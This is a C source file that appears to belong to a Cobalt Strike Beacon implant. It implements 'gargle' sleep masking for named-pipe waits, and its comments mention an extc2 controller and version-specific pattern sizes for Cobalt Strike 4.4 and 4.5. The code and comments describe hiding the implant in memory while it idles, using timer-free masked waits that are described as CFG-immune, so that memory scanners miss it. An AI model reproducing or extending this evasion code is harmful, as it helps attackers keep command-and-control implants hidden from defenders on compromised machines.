/* gargle! */
#include <winsock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"
#include "sleepmask_gen3.h"

#define GARGLE_ACTION_PIPE_WAIT   0
#define GARGLE_ACTION_PIPE_PEEK   1

typedef struct {
	int    action;
	HANDLE pipe;
	BOOL (__stdcall *ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
	DWORD(__stdcall *GetLastError)(void);
	BOOL(__stdcall *PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
	void(__stdcall *Sleep)(DWORD);
} GARGLE_PIPE_ARGS;

typedef void(*GARGLEF)(GARGLEP * parms, GARGLE_PIPE_ARGS * args);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, GARGLE_PIPE_ARGS * args) {
	GARGLE_TRAMPOLINE_STUB()
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleBlockPipe(HANDLE pipe) {
	/* Phase 2 wait-window: idle-wait for pipe data masked, in 150ms gen3
	 * slices. 150ms (not 700) because the extc2 controller contract is
	 * strict alternation with a 0.4s peek window: the heartbeat reply
	 * after a skip frame must land inside it or the relay deadlocks on
	 * FlushFileBuffers (round 18). Slices stay under the timer-free mask
	 * path - no ROP, CFG-immune; the peek between windows is a
	 * microsecond syscall. Guard semantics unchanged: threaded parents
	 * and nook==0 profiles keep the plain behavior. */
	if (setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
		DWORD avail = 0;
		while (PeekNamedPipe(pipe, NULL, 0, NULL, &avail, NULL) && avail == 0)
			if (!gen3_sleep(150))
				Sleep(150);
	}
}

BOOL GarglePipeWait(HANDLE pipe) {
	/* Phase 2 wait-window: serve the server-side connection wait inside a
	 * masked gen3 window (no timers -> CFG-immune, indefinite by
	 * construction). FALSE falls back to the plan-B ConnectNamedPipe
	 * loop exactly like the long-proven nook == 0 behavior. */
	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0)
		return FALSE;
	return gen3_wait_pipe(pipe);
}